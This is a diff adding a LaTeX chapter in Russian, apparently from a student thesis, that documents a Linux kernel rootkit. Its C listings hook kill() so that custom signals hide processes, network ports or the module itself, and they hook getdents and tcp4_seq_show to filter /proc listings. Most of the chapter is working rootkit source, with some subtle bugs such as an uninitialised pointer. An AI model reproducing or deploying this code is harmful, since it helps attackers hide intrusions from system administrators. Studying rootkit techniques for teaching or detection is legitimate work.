@@ -1,0 +1,250 @@
+\chapter{Технологический раздел}%
+\label{cha:tekhnologicheskii_razdel}
+
+
+\section{Выбор языка программирования и среды разработки}%
+\label{sec:vybor_iazyka_programmirovaniia_i_sredy_razrabotki}
+
+В качестве языка программирования был выбран язык C, так как при помощи этого языка написано большинство загружаемых модулей ОС Linux.
+
+В качестве текстового редактора был выбран текстовый редактор VsCode.
+
+
+\section{Взаимодействие с пользователем}
+Взаимодействие с пространством пользователя происходит при помощи
+механизма сигналов.
+
+В листинге 3.1 представлены объявления используемых в программе
+констант и типов. Здесь резервируются три определённых для пользователя
+сигнала, определяется структура linux\_dirent.
+
+\begin{lstlisting}[label=lst:a1, caption=Объявление констант и типов, language=c]
+    enum {
+        SIGINVISPROC = SIGUSR1, // 10
+        SIGINVISPORT = SIGUSR2, // 12
+        SIGMODHIDE   = SIGRTMIN  // 32
+    };
+    struct linux_dirent {
+        unsigned long	d_ino;
+        unsigned long	d_off;
+        unsigned short	d_reclen;
+        char		d_name[1];
+    };
+\end{lstlisting}
+
+Функция для перехвата kill определена в листинге 3.2. Перехват функции
+kill требуется для обработки новых заданных сигналов.
+
+\begin{lstlisting}[label=lst:a2, caption=Перехват функции kill, language=c]
+KHOOK_EXT(long , __x64_sys_kill , const struct pt_regs *);
+static long khook___x64_sys_kill(const struct pt_regs *pt_regs) {
+    struct task_struct *task;
+    pid_t pid = (pid_t) pt_regs->di;
+    int sig = (int) pt_regs->si;
+
+    switch (sig) {
+    case SIGINVISPROC :
+        if (( task = find_task_struct (pid)))
+            toggle_proc_invisability (task);
+        else
+            return ESRCH;
+        break;
+    case SIGINVISPORT :
+        toggle_port_invisability (pid);
+        break;
+    case SIGMODHIDE :
+        toggle_module_invisability ();
+        break;
+    default:
+        KHOOK_ORIGIN(__x64_sys_kill , pt_regs);
+    }
+    
+    return 0;
+}
+\end{lstlisting}
+
+\section{Сокрытие и отображение процессов}
+В листинге 3.3 описываются функции сокрытия и отображения процессов.
+Эти функции проверяют и устанавливают/сбрасывают разряд переменной
+flags, определённый для индикации невидимости процесса.
+
+\begin{lstlisting}[label=lst:a2, caption={Сокрытие процессов, файл реализации}, language=c]    
+    struct task_struct *find_task_struct(pid_t pid) {
+        struct task_struct *task = current;
+    
+        for_each_process(task)
+            if (task->pid == pid)
+                return task;
+    
+        return NULL;
+    }
+    
+    int is_invisible_pid(pid_t pid) {
+        if (!pid)
+            return 0;
+        return is_invisible_task_struct(find_task_struct(pid));
+    }
+    
+    int is_invisible_task_struct(struct task_struct *task) {
+        if (task)
+            return task->flags & PF_INVISIBLE;
+        return 0;
+    }
+    
+    void toggle_proc_invisability(struct task_struct *task) {
+        if (task)
+            task->flags ^= PF_INVISIBLE;
+    }
+\end{lstlisting}
+
+Функция для перехвата getdents приведена в листинге 3.4.
+
+\begin{lstlisting}[label=lst:a3, caption={Перехват getdents}, language=c]    
+KHOOK_EXT(long, __x64_sys_getdents, const struct pt_regs *);
+static long khook___x64_sys_getdents(const struct pt_regs *pt_regs) {
+    int fd; 
+    long ret;
+    long off = 0;
+
+    struct inode *d_inode;
+    struct linux_dirent *dirent, *kdirent, *dirent_var, *dirent_prev;
+
+    fd = (int)pt_regs->di;
+    dirent = (struct linux_dirent *)pt_regs->si;
+
+    ret = KHOOK_ORIGIN(__x64_sys_getdents, pt_regs);
+    if (ret <= 0)
+        return ret;
+
+    d_inode =
+        current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+    if (d_inode->i_ino != PROC_ROOT_INO)
+        return ret;
+
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if (!kdirent)
+        return ret;
+
+    if (copy_from_user(kdirent, dirent, ret)) {
+        kfree(kdirent);
+        return ret;
+    }
+
+    while (off < ret) {
+        dirent_var = (void *)kdirent + off;
+
+        if (is_invisible_pid(str_to_pid(dirent_var->d_name))) {
+            if (!dirent_prev) { // <==> if (dirent_var == kdirent)
+                memmove(
+                    dirent_var, (void *)dirent_var + dirent_var->d_reclen, ret
+                );
+                ret -= dirent_var->d_reclen;
+            }
+            else {
+                dirent_prev->d_reclen += dirent_var->d_reclen;
+                off += dirent_var->d_reclen;
+            }
+        }
+        else {
+            dirent_prev = dirent_var;
+            off += dirent_var->d_reclen;
+        }
+    }
+
+    copy_to_user(dirent, kdirent, ret);
+    kfree(kdirent);
+    return ret;
+}
+\end{lstlisting}
+
+
+\section{Сокрытие и отображение сокетов}
+
+Сетевые сокеты скрываются по номеру порта. Определённые в листинге 3.5 функции управляют
+содержимым списка в котором хранятся порты.
+\\
+
+\begin{lstlisting}[label=lst:a4, caption={Сокрытие сетевых сокетов}, language=c]
+#include <linux/in.h>
+#include <linux/in6.h>
+    
+struct hidden_port {
+    unsigned int port;
+    struct list_head list;
+};
+    
+struct list_head hidden_port_list;
+
+void net_port_hide(unsigned int port) {
+    struct hidden_port *hp;
+
+    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
+    if (!hp)
+        return;
+
+    hp->port = port;
+    list_add(&hp->list, &hidden_port_list);
+}
+
+void net_port_show(unsigned int port) {
+    struct hidden_port *hp;
+
+    list_for_each_entry (hp, &hidden_port_list, list) {
+        if (hp->port == port) {
+            list_del(&hp->list);
+            kfree(hp);
+            return;
+        }
+    }
+}
+
+int is_port_hidden(unsigned int port) {
+    struct hidden_port *hp;
+
+    list_for_each_entry (hp, &hidden_port_list, list)
+        if (hp->port == port)
+            return 1;
+
+    return 0;
+}
+
+void toggle_port_invisability(unsigned int port) {
+    if (is_port_hidden(port))
+        net_port_show(port);
+    else
+        net_port_hide(port);
+}
+\end{lstlisting}
+
+
+Функция для перехвата tcp4\_seq\_show определена в листинге 3.6. Функции для перехвата остальных системных вызовов для отображения сокетов аналогичны.
+
+\begin{lstlisting}[label=lst:a6, caption={Перехват tcp4\_seq\_show}, language=c]
+KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
+static int khook_tcp4_seq_show(struct seq_file *seq, void *v) {
+    int ret;
+    char port[12];
+    struct hidden_port *hp;
+
+    ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
+
+    list_for_each_entry (hp, &hidden_port_list, list) {
+        sprintf(port, ":%04X", hp->port);
+
+        if (strnstr(
+                    seq->buf + seq->count - PROC_NET_ROW_LEN,
+                    port,
+                    PROC_NET_ROW_LEN
+                )) {
+            seq->count -= PROC_NET_ROW_LEN;
+            break;
+        }
+    }
+
+    return ret;
+}
+\end{lstlisting}
+
+
+
+В данном разделе был выбран язык программирования, а также рассмотрена реализация программного обеспечения
